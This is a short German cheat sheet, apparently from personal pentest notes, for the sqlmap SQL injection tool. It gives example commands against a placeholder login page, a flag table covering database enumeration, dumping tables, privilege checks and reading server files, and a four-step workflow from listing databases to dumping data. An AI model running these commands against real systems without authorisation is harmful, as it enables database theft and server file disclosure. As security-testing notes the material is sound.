---
tags: [tool, exploitation, sqli]
---
# sqlmap

> Testet automatisch auf SQL Injection und liest DB oder Dateien aus.
> Input: **welche Anfrage** angreifen + **welcher Parameter** verdächtig.

## Verwendung
```bash
sqlmap -r login.req --batch --dbs                                  # aus Datei
sqlmap -u "http://ziel/login.php" --data="user=a&pass=b" --batch   # per URL
```

## Flags
| Flag                | Bedeutung                              |
| ------------------- | -------------------------------------- |
| `-r datei`          | Request aus Datei                      |
| `-u "url"`          | Ziel-URL                                |
| `--data="..."`      | POST-Parameter                         |
| `--cookie="..."`    | Cookie mitschicken                     |
| `--batch`           | keine Rückfragen                       |
| `--dbs`             | Datenbanken auflisten                  |
| `-D / -T / -C`      | DB / Tabelle / Spalte wählen           |
| `--tables / --columns / --dump` | auflisten / auslesen       |
| `--is-dba`          | DB-Admin?                              |
| `--privileges`      | Rechteliste (suche **FILE**)           |
| `--file-read=/pfad` | Serverdatei lesen                      |
| `--threads=10`      | parallelisieren (schneller bei blind)  |
| `--technique=T`     | nur eine Technik (T=time, U=union, …)  |

## Typischer Ablauf
```bash
sqlmap -r req --batch --dbs                        # 1. DBs
sqlmap -r req --batch -D DB --tables               # 2. Tabellen
sqlmap -r req --batch -D DB -T T --columns         # 3. Spalten
sqlmap -r req --batch -D DB -T T --dump            # 4. Auslesen
```

> [!warning] Nicht „Copy as cURL" in `-r`
> Das ist ein curl-Kommando, kein roher HTTP-Request. Rohen Request nehmen oder `-u --data --cookie`.
